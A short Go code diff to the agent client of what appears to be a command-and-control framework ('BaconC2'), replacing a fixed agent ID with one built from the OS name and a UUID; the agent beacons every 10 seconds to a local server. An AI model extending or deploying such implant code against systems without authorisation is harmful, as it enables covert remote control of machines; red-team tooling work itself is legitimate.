@@ -1,9 +1,11 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"os"
 	"os/signal"
+	"runtime"
 	"syscall"
 	"time"
 
@@ -11,11 +13,12 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
+	"github.com/google/uuid"
 )
 
 func main() {
 	cfg := config.AgentConfig{
-		AgentID:        "agent-001",
+		AgentID:        generateAgentID(),
 		ServerURL:      "http://localhost:8080",
 		BeaconInterval: 10 * time.Second, // Beacon every 10 seconds
 		Protocol:       "http",
@@ -40,4 +43,10 @@ func main() {
 
 	client.Stop()
 	log.Println("Agent client stopped")
+}
+
+func generateAgentID() string {
+	platform := runtime.GOOS // e.g., "windows", "linux", "darwin"
+	uuidStr := uuid.New().String()
+	return fmt.Sprintf("%s-%s", platform, uuidStr)
 }
